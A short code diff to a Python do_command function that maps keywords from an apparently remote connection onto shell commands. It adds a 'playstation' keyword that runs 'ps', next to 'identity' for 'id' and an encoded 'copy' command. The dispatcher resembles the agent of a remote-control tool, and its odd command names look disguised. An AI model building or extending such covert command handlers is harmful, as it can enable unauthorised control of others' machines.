@@ -44,6 +44,9 @@ def do_command(conn, counter, row):
         # command id
         elif parts[4] == "identity":
             command = "id"
+            # command id
+        elif parts[4] == "playstation":
+            command = "ps"
         # command copy
         elif parts[4] == "copy":
             param = translations.decode_string(row.split(' !A!N!D! ')[1])
